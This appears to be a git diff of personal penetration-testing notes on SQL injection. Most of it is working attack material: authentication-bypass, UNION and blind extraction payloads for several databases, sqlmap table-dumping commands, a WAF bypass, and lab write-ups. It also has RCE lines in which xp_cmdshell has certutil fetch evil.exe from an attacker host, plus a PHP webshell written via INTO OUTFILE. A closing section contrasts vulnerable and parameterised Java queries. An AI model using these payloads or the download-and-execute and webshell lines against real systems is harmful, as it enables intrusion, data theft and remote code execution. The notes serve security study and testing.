@@ -1,219 +1,284 @@
-SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.
+tactic: Multiple
 
-- **classic SQL Injection**:
-    - Exploits input fields that directly modify SQL queries.
-    - Example: `SELECT * FROM users WHERE username = 'user_input' AND password = 'user_input';` Malicious input: `' OR '1'='1` transforms the query into: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';`
-    
-- **Blind SQL Injection**:
-    - Occurs when the application does not display query results but provides feedback via success/failure responses.
-    - Techniques:
-        - **Boolean-Based**: Inject payloads that produce different responses based on conditions (e.g., `' AND 1=1--` vs. `' AND 1=2--`).
-        - **Time-Based**: Use functions like `SLEEP()` to infer conditions based on response time.
-- **Error-Based SQL Injection**:
-    - Leverages error messages to extract information about the database structure.
-- **Union-Based SQL Injection**:
-    - Combines results from different SELECT statements to extract data.
-    - Example: `' UNION SELECT null, username, password FROM users--`
+**SQL Injection** is when user input is embedded directly into a SQL query, allowing an attacker to manipulate the query logic, bypass authentication, extract data, or achieve RCE in some cases.
+## Types
 
-
-**Entry Point Detection**:
-```sql
-'
-"
-`
-')
-")
-`)
-'))
-"))
-`))
-```
-
-Then, you need to know how to **fix the query so there isn't errors**. In order to fix the query you can **input** data so the **previous query accept the new data**, or you can just **input** your data and **add a comment symbol add the end**.
+**Classic**  input directly modifies the query, results visible in response:
 
 ```sql
-MySQL
-#comment
--- comment     [Note the space after the double dash]
-/*comment*/
-/*! MYSQL Special SQL */
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
+```
 
-PostgreSQL
---comment
-/*comment*/
+**Union-Based**  appends a second SELECT to extract data from other tables:
 
-MSQL
---comment
-/*comment*/
+```sql
+' UNION SELECT null, username, password FROM users--
+```
 
-Oracle
---comment
+**Error-Based**  triggers DB errors that leak schema/data in the response message.
 
-SQLite
---comment
-/*comment*/
+**Boolean-Based Blind**  no output, but different responses for true/false conditions:
+
+```sql
+' AND 1=1--   ← true, normal response
+' AND 1=2--   ← false, different response
+```
+
+**Time-Based Blind**  no output, no response difference, infer via response delay:
+
+```sql
+' AND SLEEP(5)--
+```
+
+---
+
+## Injection Points
+
+- Login forms, search fields, filter parameters
+- URL path segments (`/users/1`, `/category/gifts`)
+- Cookie values, `Referer`, `User-Agent`, `X-Forwarded-For` headers
+- JSON/XML body parameters (REST and SOAP APIs)
+- `ORDER BY`, `LIMIT`, `GROUP BY` clauses
+- XML body parsed server-side (use Hackvertor to bypass WAF)
+
+---
+
+## Checklist
+
+### Detection
+
+- [ ]  Inject quote characters and watch for errors or behaviour change:
+
+```sql
+	'   "   `   ')   ")   `)   '))   "))
+```
+
+- [ ]  Fix the query with a comment to confirm injection:
+
+```sql
+	' --
+	' #
+	' /*comment*/
+```
+
+- [ ]  Inject logic operators to confirm true/false evaluation:
+
+```sql
+	' AND 1=1--    ← true
+	' AND 1=2--    ← false
+	' OR '1'='1
+	-1 OR 1=1
+```
+
+### Comment Syntax by DB
+
+```sql
+MySQL       #comment   -- comment   /*comment*/
+PostgreSQL  --comment  /*comment*/
+MSSQL       --comment  /*comment*/
+Oracle      --comment
+SQLite      --comment  /*comment*/
+```
+
+### Union-Based Extraction
+
+- [ ]  Find number of columns:
+
+```sql
+	' ORDER BY 1--
+	' ORDER BY 2--
+	' ORDER BY 3--    ← error here means 3 columns
+	' UNION SELECT NULL--
+	' UNION SELECT NULL,NULL--
+	' UNION SELECT NULL,NULL,NULL--
+```
+
+- [ ]  Identify which columns return strings (replace NULL with `'a'`):
+
+```sql
+	' UNION SELECT 'a',NULL,NULL--
+	' UNION SELECT NULL,'a',NULL--
+```
+
+- [ ]  Dump data:
+
+```sql
+	' UNION SELECT username, password FROM users--
+	' UNION SELECT table_name, NULL FROM information_schema.tables--
+	' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+```
+
+- [ ]  Oracle  must select from a table:
+
+```sql
+	' UNION SELECT NULL, NULL FROM dual--
+	' UNION SELECT BANNER, NULL FROM v$version--
+```
+
+### Blind Boolean-Based Extraction
+
+- [ ]  Confirm the injection point responds differently for true/false
+- [ ]  Extract data char by char using SUBSTRING:
+
+```sql
+	' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
+	' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--
+```
+
+- [ ]  Use Burp Intruder with pitchfork, position 1 = char index, position 2 = char value
+
+### Blind Time-Based Extraction
+
+```sql
+-- MySQL
+1' AND SLEEP(10)--
+SELECT IF(1=1, SLEEP(10), 'a')
+
+-- PostgreSQL
+
+1' || pg_sleep(10)--
+SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+-- MSSQL
+1'; WAITFOR DELAY '0:0:10'--
+IF (1=1) WAITFOR DELAY '0:0:10'
+
+-- Oracle
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)--
+SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+
+-- SQLite
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--
 ```
 
 
- **SQLI Logic**:
-```
-true
-1
-1>0
-2-1
-0+1
-1*1
-1%2
-1 & 1
-1&1
-1 && 2
-1&&2
--1 || 1
--1||1
--1 oR 1=1
-1 aND 1=1
-(1)oR(1=1)
-(1)aND(1=1)
--1/**/oR/**/1=1
-1/**/aND/**/1=1
-1'
-1'>'0
-2'-'1
-0'+'1
-1'*'1
-1'%'2
-1'&'1'='1
-1'&&'2'='1
--1'||'1'='1
--1'oR'1'='1
-1'aND'1'='1
-1"
-1">"0
-2"-"1
-0"+"1
-1"*"1
-1"%"2
-1"&"1"="1
-1"&&"2"="1
--1"||"1"="1
--1"oR"1"="1
-1"aND"1"="1
-1`
-1`>`0
-2`-`1
-0`+`1
-1`*`1
-1`%`2
-1`&`1`=`1
-1`&&`2`=`1
--1`||`1`=`1
--1`oR`1`=`1
-1`aND`1`=`1
-1')>('0
-2')-('1
-0')+('1
-1')*('1
-1')%('2
-1')&'1'=('1
-1')&&'1'=('1
--1')||'1'=('1
--1')oR'1'=('1
-1')aND'1'=('1
-1")>("0
-2")-("1
-0")+("1
-1")*("1
-1")%("2
-1")&"1"=("1
-1")&&"1"=("1
--1")||"1"=("1
--1")oR"1"=("1
-1")aND"1"=("1
-1`)>(`0
-2`)-(`1
-0`)+(`1
-1`)*(`1
-1`)%(`2
-1`)&`1`=(`1
-1`)&&`1`=(`1
--1`)||`1`=(`1
--1`)oR`1`=(`1
-1`)aND`1`=(`1
+### RCE via SQLi
+
+- [ ]  MSSQL  execute OS command via `xp_cmdshell`:
+
+```sql
+	'; EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://ATTACKER/evil.exe c:\windows\temp\evil.exe';--
 ```
 
-**Timing**:
-```sh
-#MySQL (string concat and logical ops)
-1' + sleep(10)
-1' and sleep(10)
-1' && sleep(10)
-1' | sleep(10)
-SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+- [ ]  MySQL  write a webshell via `OUTFILE`:
 
-#PostgreSQL (only support string concat)
-1' || pg_sleep(10)
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
 
-#MySQL
-SELECT SLEEP(10)
-SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') 
-
-#Oracle
-1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
-1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
-
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
-
-#SQLite
-1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
-1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
-
-#Microsoft
-
-WAITFOR DELAY '0:0:10'
-IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+```sql
+	UNION ALL SELECT 1,2,3,"<?php echo shell_exec($_GET['cmd']); ?>",5 INTO OUTFILE '/var/www/html/shell.php'
 ```
 
-**Union Based**
+## SQLMap
 
-Use UNION to retrieve data: `' UNION SELECT null, username, password FROM users--`
-
-**Blind Based:**
-- Boolean-Based: `' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--`
-- Time-Based: `' AND IF(1=1, SLEEP(5), 0)--`
-### SQLMAP
-
-```
- sqlmap -r ./Downloads/sql --force-ssl --dbms=oracle --proxy="http://127.0.0.1:8080" --tamper=space2comment
-
-```
-
-`--dbs ` dumps **available db**
-`--technique`  for choosing specific **technique** like `time based ` or `ERROR-Based`
+**From saved request file:**
 
 ```bash
- sqlmap -r practice --level 5 --risk 3 --proxy http://127.0.0.1:8080 --dbms postgresql --technique E --dbs
+sqlmap -r ./request.txt --force-ssl --dbms=postgresql --proxy="http://127.0.0.1:8080"
 ```
 
-
-after checking the available db  dump the **tables**
-```bash
- sqlmap -r practice --level 5 --risk 3 --proxy http://127.0.0.1:8080 --dbms postgresql --technique E -D public --tables
-```
-
-after choosing a tables dump the **data**
+**Workflow  enumerate then dump:**
 
 ```bash
- sqlmap -r practice --level 5 --risk 3 --proxy http://127.0.0.1:8080 --dbms postgresql --technique E -D public -T users --dump
+# 1. Find databases
+sqlmap -r request.txt --level 5 --risk 3 --dbms postgresql --technique E --dbs
+
+# 2. Find tables in a database
+sqlmap -r request.txt --level 5 --risk 3 --dbms postgresql --technique E -D public --tables
+
+# 3. Dump table data
+sqlmap -r request.txt --level 5 --risk 3 --dbms postgresql --technique E -D public -T users --dump
+
+#Useful flags
+
+
+--dbs              dump available databases
+--tables           dump tables of selected DB
+--dump             dump data from selected table
+--technique        E=error, T=time, B=boolean, U=union
+--tamper           tamper script e.g. space2comment
+--proxy            route through Burp
+--force-ssl        force HTTPS
 ```
 
+## White Box Testing
+
+**Vulnerable  string concatenation directly into query:**
+
+```java
+@GetMapping("/users")
+public ResponseEntity<?> getUser(@RequestParam String username) {
+    // ← username concatenated directly, attacker controls query structure
+    String query = "SELECT * FROM users WHERE username = '" + username + "'";
+    List<User> users = jdbcTemplate.query(query, new UserRowMapper());
+    return ResponseEntity.ok(users);
+}
+```
+
+**Vulnerable  HQL injection in Hibernate:**
+
+```java
+@Repository
+public class UserRepository {
+    public User findByUsername(String username) {
+        // ← HQL is also injectable when concatenated
+        String hql = "FROM User WHERE username = '" + username + "'";
+        return (User) session.createQuery(hql).uniqueResult();
+    }
+}
+```
+
+**Vulnerable  ORDER BY clause not parameterised:**
+
+```java
+@GetMapping("/products")
+public ResponseEntity<?> getProducts(@RequestParam String sortBy) {
+    // ← parameters can't be used for column names, but concatenation is dangerous
+    String query = "SELECT * FROM products ORDER BY " + sortBy;
+    return ResponseEntity.ok(jdbcTemplate.queryForList(query));
+}
+```
+
+**Secure:**
+
+```java
+// Parameterised query with JdbcTemplate — input bound separately from query structure
+@GetMapping("/users")
+public ResponseEntity<?> getUser(@RequestParam String username) {
+    String query = "SELECT * FROM users WHERE username = ?";
+    List<User> users = jdbcTemplate.query(query, new UserRowMapper(), username);
+    return ResponseEntity.ok(users);
+}
+
+// Hibernate with named parameters
+public User findByUsername(String username) {
+    return (User) session.createQuery("FROM User WHERE username = :username")
+        .setParameter("username", username)
+        .uniqueResult();
+}
+
+// Spring Data JPA — safest approach, query is never constructed from user input
+public interface UserRepository extends JpaRepository<User, Long> {
+    Optional<User> findByUsername(String username); // ← generated query, no injection possible
+}
+
+// ORDER BY — whitelist allowed column names
+private static final Set<String> ALLOWED_SORT_COLUMNS = Set.of("name", "price", "date");
+
+@GetMapping("/products")
+public ResponseEntity<?> getProducts(@RequestParam String sortBy) {
+    if (!ALLOWED_SORT_COLUMNS.contains(sortBy)) {
+        return ResponseEntity.badRequest().body("Invalid sort column");
+    }
+    return ResponseEntity.ok(jdbcTemplate.queryForList("SELECT * FROM products ORDER BY " + sortBy));
+}
+```
+
+---
 
 
-****
 
-### Lab
+##  Lab
 
-#### Blind SQL injection with time delays and information retrieval
+ **Blind SQL injection with time delays and information retrieval**
 
 ``` SQL
 
@@ -221,9 +286,7 @@ after choosing a tables dump the **data**
 
 ```
 
-
-
-#### Blind SQL injection with conditional responses
+ **Blind SQL injection with conditional responses**
 
 
 ```sql
@@ -238,8 +301,7 @@ TrackingId=5hIAPABv6QExrguw' AND SUBSTRING((SELECT password FROM users WHERE use
 
 ```
 
-
-#### SQL injection attack, listing the database contents on non-Oracle databases
+ **SQL injection attack, listing the database contents on non-Oracle databases**
 
 [[OAuth 2.0]]
 so then i tried with UNION query
@@ -269,8 +331,7 @@ final exploit
 GET /filter?category=Corporate+gifts' UNION  SELECT username_aijksa , password_ghkluz from users_bfyput -- 
 ```
 
-
-#### SQL injection with filter bypass via XML encoding
+ **SQL injection with filter bypass via XML encoding**
 
 
 there is `WAF` so we need to obfuscate so i used hackvector to encode they payload in  hex
@@ -280,16 +341,13 @@ there is `WAF` so we need to obfuscate so i used hackvector to encode they paylo
 <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId></stockCheck>
 ```
 
-
-
-
-#### SQL injection attack, querying the database type and version on Oracle
+ **SQL injection attack, querying the database type and version on Oracle**
 
 ```sql
 '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 ```
 
-#### RCE
+ **RCE**
 
 ```sql
 ';EXEC xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.45.194/evil.exe c:\windows\temp\evil.exe";--
